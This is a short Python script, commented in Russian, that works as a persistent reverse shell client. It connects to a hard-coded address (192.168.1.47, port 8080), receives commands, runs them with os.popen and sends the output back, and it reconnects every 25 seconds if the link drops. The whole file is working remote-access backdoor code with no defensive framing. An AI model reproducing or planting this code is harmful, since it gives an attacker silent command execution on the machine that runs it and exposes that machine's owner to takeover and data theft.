import socket
import os
import time
host = "192.168.1.47"
while True:
    try:
        sock = socket.socket()
        sock.connect((host, 8080))
        while True:
            try:
                data = sock.recv(1024).decode()  # получаем команду
                aa = os.popen(data)
                result = aa.read()
                if len(result) == 0:
                    sock.send(" ".encode())  # в случае, если рзультат
                    # пустой, отправляем пробел
                else:
                    sock.send(result.encode())  # отправляем результат
            except:
                break
    except:
        print ("EXCEPT!")
        time.sleep(25)
        print ("TRYING!")
        continue